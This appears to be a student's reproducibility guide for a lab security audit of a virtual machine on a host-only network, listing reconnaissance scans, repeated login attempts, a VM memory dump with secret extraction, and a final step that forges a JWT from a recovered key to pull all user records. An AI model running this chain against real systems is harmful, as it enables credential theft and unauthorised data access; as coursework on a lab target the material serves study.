# Validation Guide: Security Audit Reproducibility

This document provides the exact commands required to validate each section of the [Audit Report](file:///c:/Users/danie/csai-assignment-2025/resources/audit_report.md).

---

## 🛠️ Environment Prerequisites

### Kali Linux (Attacker Machine)
- **Tools**: `nmap`, `curl`, `ffuf`, `python3`, `pyjwt` (pip).
- **Network**: Host-Only (192.168.56.0/24).

### Windows Host (Forensic Machine)
- **Tools**: `VirtualBox` (VBoxManage), `Python 3.x`, `pip install pyjwt requests urllib3`.
- **Forensics**: `Volatility 3` (placed in `libs/volatility3` or installed via pip).
- **Memory Dump Path**: `c:\temp\csai_mem_new.elf`.

---

## 🌐 Section 1: Network Reconnaissance (Kali)

**1.1 Host Discovery (ARP)**
```bash
nmap -sn 192.168.56.137 -PR
```

**1.2 Full Port Scan**
```bash
nmap -sS -sV -p- -T4 192.168.56.137 -v
```

---

## 🏹 Section 2: Web Application Assessment (Kali)

**2.1 Frontend Fingerprinting**
```bash
curl -k -s https://192.168.56.137/ | grep -E "script|assets"
```

**2.2 Security Header Audit**
```bash
curl -I -k https://192.168.56.137
```

**2.3 Static Asset Enumeration**
```bash
curl -sk https://192.168.56.137/assets/index-CYy1omQq.js | grep -oP "path:\"[^\"]+\""
```

---

## 🔐 Section 3: Authentication Analysis (Kali)

**3.1 Baseline Auth Check**
```bash
curl -k -X POST https://192.168.56.137/backend/api/auth/login \
     -H "Content-Type: application/json" \
     -d '{"username":"admin","password":"wrongpassword"}'
```

**3.2 Rate Limiting Validation**
```bash
bash -c "for i in {1..7}; do curl -s -k -X POST https://192.168.56.137/backend/api/auth/login -H 'Content-Type: application/json' -d '{\"username\":\"admin\",\"password\":\"wrongpassword\"}'; echo ''; done"
```

---

## 💾 Section 4: Memory Forensics (Windows Host)

**4.1 Memory Acquisition**
```powershell
& "C:\Program Files\Oracle\VirtualBox\VBoxManage.exe" debugvm "CSAI" dumpvmcore --filename=c:\temp\csai_mem_new.elf
```

**4.2 Dump Validation**
```powershell
py -c "f=open(r'c:\temp\csai_mem_new.elf','rb'); d=f.read(1024*1024*500); print(b'SecureWebAppDb' in d)"
```

**4.3 Process ID Discovery**
```powershell
py libs/volatility3/vol.py -f c:\temp\csai_mem_new.elf windows.pslist | Select-String "MsMpEng.exe"
```

**4.4 Automated Secret Extraction**
```powershell
py extract_targeted.py
```

**4.5 Key Validation**
```powershell
py validate_secrets.py
```

---

## 🖥️ Section 5: Hypervisor Assessment (Windows Host)

**5.1 VM Configuration Audit**
```powershell
& "C:\Program Files\Oracle\VirtualBox\VBoxManage.exe" showvminfo "CSAI" --details
```

**5.2 Guest Property Inspection**
```powershell
& "C:\Program Files\Oracle\VirtualBox\VBoxManage.exe" guestproperty enumerate "CSAI"
```

---

## 📡 Section 6: Data Exfiltration (Kali/Host)

**6.1 API Data Capture**
Once you have the valid `SecretKey`:
```bash
# Set your token
TOKEN=$(python3 forge_jwt.py --secret "VALID_KEY_HERE")
# Execute exfiltration
curl -s -k -H "Authorization: Bearer $TOKEN" https://192.168.56.137/backend/api/users
```
**Expected Result**: A JSON array containing all user records (Admin + Clients).
